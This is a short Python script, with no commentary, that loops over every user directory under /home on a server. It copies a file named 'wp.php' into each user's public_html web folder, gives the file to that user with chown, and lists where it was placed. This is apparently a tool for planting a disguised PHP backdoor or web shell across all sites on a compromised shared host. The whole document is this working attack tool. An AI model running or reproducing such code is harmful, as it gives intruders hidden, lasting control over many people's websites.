# -*- coding: utf-8 -*-
import os
from shutil import copyfile

for user in os.listdir("/home"):
	if os.path.isdir("/home/"+user):
		pwd = "/home/"+user+"/public_html"
		if os.path.isdir(pwd):
			copyfile("wp.php", pwd+"/wp.php")
			os.system("chown "+user+":"+user+" "+pwd+"/wp.php")
			if os.path.isfile(pwd+"/wp.php"):
				print(pwd+"/wp.php")
